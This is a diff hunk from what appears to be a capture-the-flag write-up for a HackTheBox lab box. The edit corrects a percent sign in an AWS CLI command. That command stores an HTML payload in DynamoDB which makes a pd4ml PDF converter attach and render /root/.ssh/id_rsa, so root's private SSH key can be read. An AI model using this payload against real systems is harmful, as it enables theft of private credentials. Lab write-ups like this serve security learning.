@@ -106,7 +106,7 @@ aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alert
   --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
 
 aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts \
-  --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><body><pd4ml:attachment src=\"files/id_rsa\" description=\"id_rsa\"/><iframe src=\"file:///root/.ssh/id_rsa\" width=100%% height=1000></iframe></body></html>"}}'
+  --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><body><pd4ml:attachment src=\"files/id_rsa\" description=\"id_rsa\"/><iframe src=\"file:///root/.ssh/id_rsa\" width=100% height=1000></iframe></body></html>"}}'
 ```
 
 Trigger the conversion (tunnel `:8000` over SSH, since it's localhost-only) and fetch the PDF:
